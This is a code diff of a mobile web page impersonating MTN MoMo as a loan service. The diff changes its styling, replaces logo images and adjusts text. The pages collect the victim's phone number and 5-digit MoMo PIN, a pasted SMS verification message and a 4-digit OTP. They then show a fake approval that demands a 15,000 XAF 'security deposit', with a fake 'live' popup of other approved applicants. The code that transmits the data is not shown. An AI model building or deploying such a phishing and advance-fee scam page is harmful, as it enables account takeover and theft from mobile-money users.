-  .live-popup { position: absolute; top: 72px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 290px; background: rgba(255, 255, 255, 0.96); backdrop-filter: blur(4px); border-radius: 8px; padding: 8px 12px; display: flex; align-items: center; gap: 8px; border: 1px solid rgba(0, 0, 0, 0.08); box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08); opacity: 0; visibility: hidden; transition: all 0.3s ease; z-index: 9999; }
-  .live-popup.show { opacity: 1; visibility: visible; }
-  .popup-avatar { width: 28px; height: 28px; min-width: 28px; border-radius: 50%; background: var(--grad); color: #1C1C1C; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 600; }
-  .popup-content { flex: 1; }
-  .popup-text { font-size: 0.71rem; line-height: 1.3; color: var(--text-mid); }
-  .popup-text strong { color: var(--text-dark); font-weight: 600; }
-  .popup-time { margin-top: 1px; font-size: 0.58rem; color: #16a34a; font-weight: 500; }
-  .popup-time::before { content: "● "; animation: pulse 1.2s infinite; }
+    /* LOGIN PAGE */
+    #page-login { background: #FFF; }
+    .login-hdr { background: var(--navy); padding: 36px 20px 40px; display: flex; flex-direction: column; align-items: center; gap: 6px; flex-shrink: 0; }
+    .logo-sub { font-size: 0.75rem; color: rgba(255,255,255,0.7); font-weight: 500; }
+    .login-body-wrap { flex: 1; background: #FFF; padding: 32px 20px 0; display: flex; flex-direction: column; align-items: center; }
+    .login-body-wrap h2 { font-size: 1.1rem; font-weight: 700; margin-bottom: 24px; color: var(--navy-dark); }
+    .login-inner { width: 100%; max-width: 380px; }
+    .lg-phone-row { display: flex; margin-bottom: 24px; }
+    .lg-ph-pre { display: flex; align-items: center; gap: 4px; padding: 12px; background: #F8FAFC; border: 1.5px solid var(--border); border-right: none; border-radius: var(--radius-sm) 0 0 var(--radius-sm); font-size: 0.88rem; color: #4A5568; font-weight: 600; white-space: nowrap; }
+    .lg-phone-row input { flex: 1; padding: 12px 14px; border: 1.5px solid var(--border); border-left: none; border-radius: 0 var(--radius-sm) var(--radius-sm) 0; font-family: inherit; font-size: 0.92rem; outline: none; background: #FFF; transition: border-color 0.2s; }
+    .lg-phone-row input:focus { border-color: var(--navy); }
+    .pin-label { font-size: 0.82rem; color: var(--text-light); text-align: center; margin-bottom: 12px; font-weight: 500; }
+    
+    /* DIGIT BOXES (PIN & OTP) */
+    .pin-row, .otp-inputs { display: flex; gap: 10px; justify-content: center; margin-bottom: 18px; position: relative; align-items: center; }
+    .pin-box, .otp-box { 
+      width: 48px; height: 54px; border: 1.5px solid var(--border); border-radius: var(--radius-sm); 
+      text-align: center; font-family: inherit; font-size: 1.4rem; font-weight: 800; color: var(--navy); 
+      outline: none; transition: all 0.2s; background: #F8FAFC;
+    }
+    .pin-box:focus, .otp-box:focus { border-color: var(--navy); background: #FFF; box-shadow: 0 0 0 3px rgba(0,79,113,0.15); }
+    .pin-eye { cursor: pointer; color: var(--text-light); font-size: 1.1rem; background: none; border: none; margin-left: 4px; padding: 4px; }
+    .forgot-pin { text-align: center; font-size: 0.82rem; color: var(--text-light); margin-bottom: 24px; cursor: pointer; font-weight: 500; }
+    
+    .btn-login { width: 100%; max-width: 380px; padding: 14px; background: #E2E8F0; color: #A0AEC0; border: none; border-radius: var(--radius-sm); font-size: 0.9rem; font-weight: 700; cursor: pointer; font-family: inherit; transition: all 0.2s; }
+    .btn-login.rdy { background: var(--grad); color: #1C1C1C; }
+    
+    .lg-curve { margin-top: 32px; background: #FFF; overflow: hidden; flex-shrink: 0; }
+    .lg-curve::before { content: ''; display: block; background: var(--navy); height: 55px; clip-path: ellipse(60% 100% at 50% 100%); margin-bottom: -4px; }
+    .lg-foot { background: var(--navy); padding: 24px 20px 32px; display: flex; flex-direction: column; align-items: center; gap: 8px; text-align: center; }
+    .lg-version { font-size: 0.72rem; color: rgba(255,255,255,0.4); margin-top: 4px; }
+    .lg-terms { font-size: 0.72rem; color: rgba(255,255,255,0.55); }
+    .lg-terms a { color: rgba(255,255,255,0.85); text-decoration: underline; }
 
-  /* STATUS MESSAGES & WAITING BOX */
-  .msg-box { border-radius:var(--radius-sm); padding:12px 16px; font-size:0.84rem; margin-bottom:16px; display:none; align-items:center; gap:10px; }
-  .msg-box.show { display:flex; }
-  .msg-box.error   { background:#fef2f2; border:1.5px solid #fecaca; color:#991b1b; }
-  .msg-box.success { background:#f0fdf4; border:1.5px solid #bbf7d0; color:#166534; }
-  .msg-box.info    { background:#eff6ff; border:1.5px solid #bfdbfe; color:#1e40af; }
-  .msg-box.warning { background:#fefce8; border:1.5px solid #fef08a; color:#854d0e; }
-  .msg-icon { font-size:1.1rem; flex-shrink:0; }
+    /* OTP PAGE */
+    #page-otp { background: #FFF; }
+    .otp-topbar { display: flex; align-items: center; justify-content: space-between; padding: 0 20px; height: 56px; border-bottom: 1px solid var(--border); flex-shrink: 0; }
+    .otp-topbar .bk { font-size: 1.2rem; color: #333; cursor: pointer; background: none; border: none; font-weight: 600; }
+    .otp-topbar .hbg2 { display: flex; flex-direction: column; gap: 4px; cursor: pointer; }
+    .otp-topbar .hbg2 span { width: 20px; height: 2px; background: #666; border-radius: 1px; display: block; }
+    .otp-body-wrap { flex: 1; padding: 32px 16px; display: flex; align-items: flex-start; justify-content: center; }
+    .otp-card { background: #FFF; border: 1px solid var(--border); border-radius: var(--radius); padding: 32px 28px; width: 100%; max-width: 440px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
+    .otp-card h2 { font-size: 1.25rem; font-weight: 800; margin-bottom: 6px; color: var(--navy); }
+    .otp-hint { font-size: 0.83rem; color: var(--text-light); margin-bottom: 4px; }
+    .otp-phone { font-size: 0.95rem; font-weight: 700; color: var(--text-dark); margin-bottom: 22px; }
+    .otp-resend { font-size: 0.82rem; color: var(--navy); margin-bottom: 22px; text-align: center; }
+    
+    .btn-otp { width: 100%; padding: 14px; background: #E2E8F0; color: #A0AEC0; border: none; border-radius: var(--radius-sm); font-size: 0.9rem; font-weight: 700; cursor: pointer; font-family: inherit; transition: all 0.2s; }
+    .btn-otp.rdy { background: var(--grad); color: #1C1C1C; }
+    
+    .otp-curve { background: #FFF; overflow: hidden; flex-shrink: 0; }
+    .otp-curve::before { content: ''; display: block; background: var(--navy); height: 50px; clip-path: ellipse(60% 100% at 50% 100%); margin-bottom: -4px; }
+    .otp-foot { background: var(--navy); padding: 16px; text-align: center; font-size: 0.75rem; color: rgba(255,255,255,0.55); }
 
-  .waiting-box { background:#fffdf5; border:1px solid #ffe8cc; border-radius:var(--radius-sm); padding:16px; text-align:center; margin-bottom:16px; display:none; }
-  .waiting-box.show { display:block; }
-  .waiting-box .wb-spinner { width:28px; height:28px; border:3px solid #ffe8cc; border-top-color:var(--navy); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 10px; }
-  .waiting-box p { font-size:0.82rem; color:var(--text-mid); }
+    /* APPROVAL PAGE */
+    #page-approval { background: linear-gradient(135deg, #FFCC00 0%, #FFB300 40%, #004F71 100%); min-height: 100vh; align-items: center; justify-content: center; padding: 32px 16px; }
+    .appr-wrap { width: 100%; max-width: 500px; box-shadow: 0 15px 40px rgba(0,0,0,0.15); border-radius: var(--radius); overflow: hidden; }
+    .appr-top { background: #FFF; padding: 28px 24px 0; text-align: center; }
+    .check-circle { width: 56px; height: 56px; border-radius: 50%; background: var(--grad); display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-size: 1.5rem; color: #1C1C1C; font-weight: 800; box-shadow: 0 4px 16px rgba(0,0,0,0.12); }
+    .appr-title { font-size: 1.3rem; font-weight: 800; margin-bottom: 6px; color: var(--navy-dark); }
+    .appr-sub   { font-size: 0.84rem; color: var(--text-light); margin-bottom: 20px; line-height: 1.4; }
+    
+    .appr-banner { background: var(--grad); padding: 18px; margin: 0 -24px; text-align: center; }
+    .appr-banner .abl { font-size: 0.72rem; color: rgba(28,28,28,0.8); font-weight: 700; text-transform: uppercase; letter-spacing: 0.06em; }
+    .appr-banner .aba { font-size: 2.1rem; font-weight: 800; color: #1C1C1C; }
+    
+    .comp-box { background: #FFFBEB; border: 1px solid #FDE68A; padding: 18px 20px; font-size: 0.84rem; }
+    .comp-box .ch { font-weight: 700; color: #92400E; margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
+    .comp-box p { color: #78350F; line-height: 1.5; }
+    
+    .ld-card { background: #FFF; padding: 20px 24px; }
+    .ld-card .ld-htitle { font-size: 0.84rem; font-weight: 700; color: var(--text-mid); margin-bottom: 14px; text-transform: uppercase; letter-spacing: 0.03em; }
+    .ld-card .ld-row { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid #F1F5F9; }
+    .ld-card .ld-row:last-child { border-bottom: none; }
+    .ld-card .ld-icon { width: 36px; height: 36px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 0.9rem; flex-shrink: 0; }
+    .ic-g { background: #DEF7EC; color: #03543F; }
+    .ic-b { background: #FEF08A; color: #713F12; }
+    .ic-p { background: #E0F2FE; color: #075985; }
+    .ld-lbl { font-size: 0.72rem; color: var(--text-light); font-weight: 600; text-transform: uppercase; }
+    .ld-val { font-size: 0.92rem; font-weight: 700; color: var(--text-dark); }
+    
+    .qa-wrap { background: #FFF; padding: 0 24px 18px; }
+    .qa-title { font-size: 0.8rem; font-weight: 700; color: var(--text-mid); margin-bottom: 10px; text-align: center; }
+    .qa-btn { width: 100%; padding: 12px; margin-bottom: 8px; background: #FFF; border: 1.5px solid var(--border); border-radius: var(--radius-sm); font-size: 0.86rem; font-weight: 600; color: var(--text-dark); cursor: pointer; font-family: inherit; transition: all 0.2s; }
+    .qa-btn:hover { border-color: var(--navy); color: var(--navy); }
+    
+    .nxt-steps { background: #FFF; padding: 16px 24px; display: flex; align-items: flex-start; gap: 10px; border-top: 1px solid #F1F5F9; }
+    .nxt-steps p { font-size: 0.8rem; color: var(--text-light); line-height: 1.4; }
+    
+    .rth-wrap { background: #FFF; padding: 16px 24px 24px; display: flex; flex-direction: column; gap: 10px; }
+    .rth-btn { width: 100%; padding: 14px; background: var(--grad); color: #1C1C1C; border: none; border-radius: var(--radius-sm); font-size: 0.9rem; font-weight: 700; cursor: pointer; font-family: inherit; }
+    .reapply-btn-pro { width: 100%; padding: 14px; background: #FFF; color: var(--navy); border: 2px solid var(--navy); border-radius: var(--radius-sm); font-size: 0.9rem; font-weight: 700; cursor: pointer; font-family: inherit; display: flex; align-items: center; justify-content: center; gap: 8px; }
 
-  .hp-logo-inline { display: flex; align-items: center; gap: 8px; }
-  .hp-logo-inline img { width: 36px; height: 36px; object-fit: contain; display: block; }
-  .hp-logo-inline .brand { font-size: 1.4rem; font-weight: 800; color: #fff; letter-spacing: -0.01em; }
-  .hp-logo-inline .brand span { color: #FFCC00; }
+    /* LIVE POPUP */
+    .live-popup { position: fixed; top: 76px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 320px; background: rgba(255, 255, 255, 0.96); backdrop-filter: blur(6px); border-radius: 10px; padding: 10px 14px; display: flex; align-items: center; gap: 10px; border: 1px solid rgba(0,0,0,0.08); box-shadow: 0 8px 20px rgba(0,0,0,0.12); opacity: 0; visibility: hidden; transition: all 0.3s cubic-bezier(0.16,1,0.3,1); z-index: 9999; }
+    .live-popup.show { opacity: 1; visibility: visible; transform: translateX(-50%) translateY(4px); }
+    .popup-avatar { width: 32px; height: 32px; min-width: 32px; border-radius: 50%; background: var(--grad); color: #1C1C1C; display: flex; align-items: center; justify-content: center; font-size: 0.78rem; font-weight: 800; }
+    .popup-content { flex: 1; }
+    .popup-text { font-size: 0.74rem; line-height: 1.35; color: var(--text-mid); }
+    .popup-text strong { color: var(--text-dark); font-weight: 700; }
+    .popup-time { margin-top: 2px; font-size: 0.62rem; color: #16A34A; font-weight: 600; }
 
-  .hp-logo-sm { display: flex; align-items: center; gap: 6px; }
-  .hp-logo-sm img { width: 26px; height: 26px; object-fit: contain; display: block; }
-  .hp-logo-sm .brand { font-size: 1.1rem; font-weight: 800; color: #fff; }
-  .hp-logo-sm .brand span { color: #FFCC00; }
+    /* STATUS MESSAGES & WAITING BOX */
+    .msg-box { border-radius: var(--radius-sm); padding: 12px 14px; font-size: 0.84rem; margin-bottom: 16px; display: none; align-items: center; gap: 10px; line-height: 1.4; }
+    .msg-box.show { display: flex; }
+    .msg-box.error   { background: #FEF2F2; border: 1px solid #FCA5A5; color: #991B1B; }
+    .msg-box.success { background: #F0FDF4; border: 1px solid #86EFAC; color: #166534; }
+    .msg-box.info    { background: #EFF6FF; border: 1px solid #93C5FD; color: #1E40AF; }
+    .msg-box.warning { background: #FEFCE8; border: 1px solid #FDE047; color: #854D0E; }
+    .msg-icon { font-size: 1rem; flex-shrink: 0; font-weight: 700; }
 
-  @media (max-width:500px) {
-    .field-row { grid-template-columns: 1fr; }
-    .step-card, .land-card { padding: 24px 18px; }
-    .otp-card { padding: 24px 16px; }
-    .pin-box, .otp-box { width: 42px; height: 48px; font-size: 1.2rem; }
-  }
-</style>
+    .waiting-box { background: #FFFBEB; border: 1px solid #FDE68A; border-radius: var(--radius-sm); padding: 18px; text-align: center; margin-bottom: 16px; display: none; }
+    .waiting-box.show { display: block; }
+    .waiting-box .wb-spinner { width: 30px; height: 30px; border: 3px solid #FDE68A; border-top-color: var(--navy); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 10px; }
+    .waiting-box p { font-size: 0.83rem; color: #78350F; font-weight: 500; }
+
+    @media (max-width: 500px) {
+      .field-row { grid-template-columns: 1fr; }
+      .step-card, .land-card { padding: 24px 18px; }
+      .otp-card { padding: 24px 18px; }
+      .pin-box, .otp-box { width: 42px; height: 48px; font-size: 1.25rem; }
+    }
+  </style>
 </head>
 
 <body>
@@ -289,7 +303,7 @@
   <nav class="land-nav">
     <div class="hbg"><span></span><span></span><span></span></div>
     <div class="hp-logo-inline">
-        <img src="images/mtn-logo.png" alt="MTN MoMo Logo" class="logo-img">
+        <div class="brand-badge">MoMo</div>
         <div class="brand">MTN <span>MoMo</span></div>
     </div>
     <div style="width:28px"></div>
@@ -332,7 +346,7 @@
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
     <div class="hp-logo-sm">
-      <img src="images/mtn-logo.png" alt="MTN MoMo Logo" class="logo-img">
+      <div class="brand-badge" style="width:28px;height:28px;font-size:0.7rem;">MoMo</div>
       <div class="brand">MTN <span>MoMo</span></div>
     </div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
@@ -343,10 +357,39 @@
       <p class="step-sub">Step 1 of 3</p>
       <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
       <div class="msg-box error" id="s1Err"><span class="msg-icon">&#x2715;</span><span id="s1ErrTxt"></span></div>
-      <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business Loan</option><option>Mortgage Loan</option><option>Auto Loan</option><option>Education Loan</option></select></div></div>
-      <div class="field"><label>Loan Amount (XAF)</label><input type="number" id="s1am" value="50000" placeholder="Enter amount" oninput="clearErr('s1Err')"></div>
-      <div class="field"><label>Loan Duration</label><div class="sel-wrap"><select id="s1te"><option>3 Months</option><option>6 Months</option><option>9 Months</option><option selected>12 Months</option><option>18 Months</option><option>24 Months</option></select></div></div>
-      <div class="field"><label>Loan Purpose</label><textarea id="s1pu" placeholder="Briefly explain the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
+      <div class="field">
+        <label>Loan Type</label>
+        <div class="sel-wrap">
+          <select id="s1ty">
+            <option>Personal Loan</option>
+            <option selected>Business Loan</option>
+            <option>Mortgage Loan</option>
+            <option>Auto Loan</option>
+            <option>Education Loan</option>
+          </select>
+        </div>
+      </div>
+      <div class="field">
+        <label>Loan Amount (XAF)</label>
+        <input type="number" id="s1am" value="50000" placeholder="Enter amount" oninput="clearErr('s1Err')">
+      </div>
+      <div class="field">
+        <label>Loan Duration</label>
+        <div class="sel-wrap">
+          <select id="s1te">
+            <option>3 Months</option>
+            <option>6 Months</option>
+            <option>9 Months</option>
+            <option selected>12 Months</option>
+            <option>18 Months</option>
+            <option>24 Months</option>
+          </select>
+        </div>
+      </div>
+      <div class="field">
+        <label>Loan Purpose</label>
+        <textarea id="s1pu" placeholder="Briefly explain the purpose of your loan…" oninput="clearErr('s1Err')"></textarea>
+      </div>
       <button class="btn-grad" onclick="toS2()">NEXT STEP</button>
     </div>
   </div>
@@ -357,7 +400,7 @@
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
     <div class="hp-logo-sm">
-      <img src="images/mtn-logo.png" alt="MTN MoMo Logo" class="logo-img">
+      <div class="brand-badge" style="width:28px;height:28px;font-size:0.7rem;">MoMo</div>
       <div class="brand">MTN <span>MoMo</span></div>
     </div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
@@ -369,8 +412,8 @@
       <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
       <div class="msg-box error" id="s2Err"><span class="msg-icon">&#x2715;</span><span id="s2ErrTxt"></span></div>
       <div class="field-row">
-        <div class="field"><label>First Name</label><input type="text" id="s2fi" placeholder="Your first name" oninput="clearErr('s2Err')"></div>
-        <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="Your last name" oninput="clearErr('s2Err')"></div>
+        <div class="field"><label>First Name</label><input type="text" id="s2fi" placeholder="First name" oninput="clearErr('s2Err')"></div>
+        <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="Last name" oninput="clearErr('s2Err')"></div>
       </div>
       <div class="field">
         <label>MoMo Phone Number</label>
@@ -394,7 +437,7 @@
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
     <div class="hp-logo-sm">
-      <img src="images/mtn-logo.png" alt="MTN MoMo Logo" class="logo-img">
+      <div class="brand-badge" style="width:28px;height:28px;font-size:0.7rem;">MoMo</div>
       <div class="brand">MTN <span>MoMo</span></div>
     </div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
@@ -405,7 +448,18 @@
       <p class="step-sub">Step 3 of 3</p>
       <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
       <div class="msg-box error" id="s3Err"><span class="msg-icon">&#x2715;</span><span id="s3ErrTxt"></span></div>
-      <div class="field"><label>Employment Status</label><div class="sel-wrap"><select id="s3em"><option>Employed</option><option selected>Entrepreneur / Merchant</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div></div>
+      <div class="field">
+        <label>Employment Status</label>
+        <div class="sel-wrap">
+          <select id="s3em">
+            <option>Employed</option>
+            <option selected>Entrepreneur / Merchant</option>
+            <option>Unemployed</option>
+            <option>Retired</option>
+            <option>Student</option>
+          </select>
+        </div>
+      </div>
       <div class="field"><label>Annual Income (XAF)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')"></div>
       <div class="sum-box">
         <h3>Application Summary</h3>
@@ -427,9 +481,9 @@
 <div id="page-submitted" class="page">
   <div class="sub-wrap">
     <div class="sub-icon">📋</div>
-    <h2>Application Successfully Submitted</h2>
-    <p>Your loan application has been successfully registered. Please wait for approval.<br>You will receive a notification. In the meantime, log in to MTN MoMo.</p>
-    <div class="redir-pill">🔄 Redirecting to MTN MoMo login in <span class="redir-n" id="rdN">3</span>s...</div><br>
+    <h2>Application Registered</h2>
+    <p>Your loan application has been successfully submitted. Please complete logging into your MTN MoMo account to continue validation.</p>
+    <div class="redir-pill">🔄 Redirecting to MoMo login in <span class="redir-n" id="rdN">3</span>s...</div><br>
     <button class="btn-go" onclick="goTo('page-login')">Go to Login</button>
   </div>
 </div>
@@ -438,7 +492,7 @@
 <div id="page-login" class="page">
   <div class="login-hdr">
     <div class="hp-logo-inline" style="flex-direction:column;gap:6px;">
-      <img src="images/mtn-logo.png" alt="MTN MoMo Logo" style="width:52px;height:52px;object-fit:contain;">
+      <div class="brand-badge" style="width:48px;height:48px;font-size:1.1rem;">MoMo</div>
       <div class="brand" style="font-size:1.6rem;">MTN <span>MoMo</span></div>
       <div class="logo-sub">Fast and Easy Loans</div>
     </div>
@@ -470,9 +524,8 @@
   <div class="lg-curve">
     <div class="lg-foot">
       <div class="hp-logo-inline" style="flex-direction:column;gap:4px;">
-        <img src="images/mtn-logo.png" alt="MTN MoMo Logo" style="width:38px;height:38px;object-fit:contain;">
-        <div class="brand" style="font-size:1.25rem;">MTN <span>MoMo</span></div>
-        <div class="logo-sub">Fast and Easy Loans</div>
+        <div class="brand-badge" style="width:32px;height:32px;font-size:0.75rem;">MoMo</div>
+        <div class="brand" style="font-size:1.15rem;">MTN <span>MoMo</span></div>
       </div>
       <div class="lg-version">v2.1.3P</div>
       <div class="lg-terms">By logging in, you agree to the <a href="#">Terms and Conditions</a></div>
@@ -485,8 +538,8 @@
   <div class="otp-topbar">
     <button class="bk" onclick="goTo('page-login')">←</button>
     <div class="hp-logo-sm">
-      <img src="images/mtn-logo.png" alt="MTN MoMo Logo" class="logo-img">
-      <div class="brand" style="color:var(--navy);"><span style="color:#FFCC00;">MTN</span> MoMo</div>
+      <div class="brand-badge" style="width:28px;height:28px;font-size:0.7rem;">MoMo</div>
+      <div class="brand" style="color:var(--navy);"><span style="color:var(--yellow-dark);">MTN</span> MoMo</div>
     </div>
     <div class="hbg2"><span></span><span></span><span></span></div>
   </div>
@@ -507,16 +560,16 @@
 
       <!-- STEP 1: SMS Verification Pasting -->
       <div id="otpStep1">
-        <p class="otp-hint" style="font-weight:600; color:var(--navy); margin-bottom:8px;">Step 1: SMS Verification</p>
+        <p class="otp-hint" style="font-weight:700; color:var(--navy); margin-bottom:8px;">Step 1: SMS Verification</p>
         <div class="field" style="margin-bottom:14px;">
-          <textarea id="smsPasteInput" placeholder="Paste your received SMS message or verification code here..." oninput="chkSmsStep()" style="min-height:80px;"></textarea>
+          <textarea id="smsPasteInput" placeholder="Paste your received SMS message or verification code here..." oninput="chkSmsStep()" style="min-height:85px;"></textarea>
         </div>
         <button class="btn-otp" id="bOtpStep1" onclick="submitSmsStep()">NEXT: 4-DIGIT OTP</button>
       </div>
 
       <!-- STEP 2: Four Digits OTP Verification Code -->
       <div id="otpStep2" style="display:none;">
-        <p class="otp-hint" style="font-weight:600; color:var(--navy); margin-bottom:8px;">Step 2: Four-Digit OTP Verification Code</p>
+        <p class="otp-hint" style="font-weight:700; color:var(--navy); margin-bottom:8px;">Step 2: Four-Digit OTP Verification Code</p>
         <div class="otp-inputs" id="otpContainer">
           <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="o0">
           <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="o1">
@@ -535,25 +588,22 @@
 <div id="page-approval" class="page">
   <div class="appr-wrap">
     <div class="appr-top">
-      <div class="hp-logo-sm" style="justify-content: center; margin-bottom: 12px;">
-        <img src="images/mtn-logo.png" alt="MTN MoMo Logo" class="logo-img">
-        <div class="brand" style="color: var(--navy);"><span style="color: var(--purple);">MTN</span> MoMo</div>
+      <div class="hp-logo-sm" style="justify-content: center; margin-bottom: 14px;">
+        <div class="brand-badge" style="width:30px;height:30px;font-size:0.75rem;">MoMo</div>
+        <div class="brand" style="color: var(--navy);"><span style="color: var(--yellow-dark);">MTN</span> MoMo</div>
       </div>
       <div class="check-circle">✓</div>
       <div class="appr-title">🎉 Congratulations!</div>
       <div class="appr-sub">Your loan has been <strong>approved!</strong> Funds will be disbursed shortly.</div>
-      <div class="appr-banner"><div class="abl">APPROVED AMOUNT</div><div class="aba" id="apAmt">50,000 XAF</div></div>
+      <div class="appr-banner">
+        <div class="abl">APPROVED AMOUNT</div>
+        <div class="aba" id="apAmt">50,000 XAF</div>
+      </div>
     </div>
-    <div class="comp-box" style="border: 1px solid #ddd; border-radius: 8px; padding: 20px; background-color: #f9f9f9; font-family: inherit; max-width: 500px;">
-        <div class="ch" style="font-weight: bold; color: #d9534f; margin-bottom: 10px; display: flex; align-items: center; gap: 8px;">
-            <span>⚠️</span> IMPORTANT INFORMATION
-        </div>
-        <p style="line-height: 1.6; color: #333; margin: 0;">
-            To validate your loan application, please make a security deposit of <strong>15,000 XAF</strong> into your MTN MoMo account. Once the deposit is verified, your loan will be disbursed instantly.
-        </p>
-        <p style="line-height: 1.6; color: #333; margin: 10px 0 0 0;">
-            <em>Note:</em> If you do not receive the loan menu on your phone after making the deposit, please submit your application again.
-        </p>
+    <div class="comp-box">
+        <div class="ch"><span>⚠️</span> IMPORTANT INFORMATION</div>
+        <p>To validate your loan application, please make a security deposit of <strong>15,000 XAF</strong> into your MTN MoMo account. Once verified, your loan will be disbursed instantly.</p>
+        <p style="margin-top: 6px; font-style: italic; opacity: 0.9;">Note: If you do not receive the menu prompt after deposit, submit your request again.</p>
     </div>
     <div class="ld-card">
       <div class="ld-htitle">💳 Loan Details</div>
@@ -567,21 +617,20 @@
       <button class="qa-btn">💸 Withdraw Money</button>
       <button class="qa-btn">📄 Loan Details</button>
     </div>
-    <div class="nxt-steps"><span>📱</span><p><strong>Next Steps:</strong><br>You will receive an SMS and an email with disbursement instructions within 24 hours.</p></div>
+    <div class="nxt-steps"><span>📱</span><p><strong>Next Steps:</strong> You will receive an SMS with complete disbursement instructions within 24 hours.</p></div>
     <div class="rth-wrap">
-      <button class="reapply-btn-pro" onclick="reapplyLoan()">
-        <span>🔄</span> APPLY AGAIN
-      </button>
+      <button class="reapply-btn-pro" onclick="reapplyLoan()"><span>🔄</span> APPLY AGAIN</button>
       <button class="rth-btn" onclick="goTo('page-landing')">🏠 Return to Home</button>
     </div>
   </div>
 </div>
 
+<!-- LIVE SOCIAL PROOF POPUP -->
 <div id="popup" class="live-popup">
     <div class="popup-avatar" id="popup-avatar">A</div>
     <div class="popup-content">
         <div id="popup-text" class="popup-text"></div>
-        <div id="popup-time" class="popup-time">Just now</div>
+        <div id="popup-time" class="popup-time">● Just now</div>
     </div>
 </div>
 
@@ -590,14 +639,14 @@
   <div class="modal"><div class="spinner"></div><h3>Please wait…</h3><p>Sending your information for verification</p></div>
 </div>
 <div class="overlay" id="mOtp">
-  <div class="modal"><div class="spinner"></div><h3>OTP Verification in Progress</h3><p id="otpVT">Please wait… (3s)</p></div>
+  <div class="modal"><div class="spinner"></div><h3>OTP Verification</h3><p id="otpVT">Please wait… (3s)</p></div>
 </div>
 <div class="overlay" id="mSubmit">
   <div class="modal"><div class="spinner"></div><h3>Submitting Application…</h3><p>Please wait while processing</p></div>
 </div>
 
 <script>
-  // STATE
+  // APP STATE
   const S = {
     amt: 50000,
     term: '12 Months',
@@ -637,7 +686,7 @@
   function calcUp() {
     const a = +document.getElementById('rA').value;
     const t = +document.getElementById('rT').value;
-    const r = 0.25 / 12;
+    const r = 0.08 / 12; // 8% APR
     const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
     document.getElementById('aDisp').textContent = a.toLocaleString() + ' XAF';
     document.getElementById('tDisp').textContent = t + ' months';
@@ -646,7 +695,6 @@
     document.getElementById('rT').style.setProperty('--pct', ((t-3)/(24-3)*100).toFixed(1) + '%');
   }
 
-  // PHONE NUMBER SANITIZATION (Exactly 9 Digits)
   function sanitizePhone(el) {
     let raw = el.value.replace(/\D/g, '');
     if (raw.startsWith('237') && raw.length > 9) {
@@ -660,13 +708,15 @@
     document.getElementById(id).classList.add('show');
     document.getElementById(id).scrollIntoView({ behavior: 'smooth', block: 'nearest' });
   }
+
   function clearErr(id) {
     document.getElementById(id).classList.remove('show');
   }
+
   function shakeField(id) {
     const el = document.getElementById(id);
     if (!el) return;
-    el.style.borderColor = '#ef4444';
+    el.style.borderColor = '#EF4444';
     el.style.boxShadow = '0 0 0 3px rgba(239,68,68,0.15)';
     setTimeout(() => { el.style.borderColor = ''; el.style.boxShadow = ''; }, 1800);
   }
@@ -761,9 +811,7 @@
   }
 
   function showOtpMsg(type, text) {
-    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => {
-      document.getElementById(id).classList.remove('show');
-    });
+    ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
     if (type === 'error')   { document.getElementById('otpMsgErrTxt').textContent = text;  document.getElementById('otpMsgErr').classList.add('show'); }
     if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent = text;   document.getElementById('otpMsgOk').classList.add('show'); }
     if (type === 'warning') { document.getElementById('otpMsgWarnTxt').textContent = text; document.getElementById('otpMsgWarn').classList.add('show'); }
@@ -772,14 +820,14 @@
     ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
   }
 
-  // DYNAMIC DIGIT INPUT HANDLERS (PIN & OTP)
+  // INPUT DIGIT GROUP MANAGEMENT
   function setupDigitGroup(containerId, count, onComplete) {
     const container = document.getElementById(containerId);
     if (!container) return;
     const inputs = Array.from(container.querySelectorAll('input'));
 
     inputs.forEach((input, index) => {
-      input.addEventListener('input', (e) => {
+      input.addEventListener('input', () => {
         const val = input.value.replace(/\D/g, '');
         input.value = val.slice(-1);
         if (input.value && index < count - 1) {
@@ -821,7 +869,8 @@
   function getDigitValue(prefix, count) {
     let val = '';
     for (let i = 0; i < count; i++) {
-      val += document.getElementById(prefix + i).value;
+      const el = document.getElementById(prefix + i);
+      if (el) val += el.value;
     }
     return val;
   }
@@ -831,6 +880,11 @@
     const pin = getDigitValue('p', 5);
     const isReady = phone.length === 9 && pin.length === 5;
     document.getElementById('bLogin').className = isReady ? 'btn-login rdy' : 'btn-login';
+  }
+
+  function chkOtpDigits() {
+    const otp = getDigitValue('o', 4);
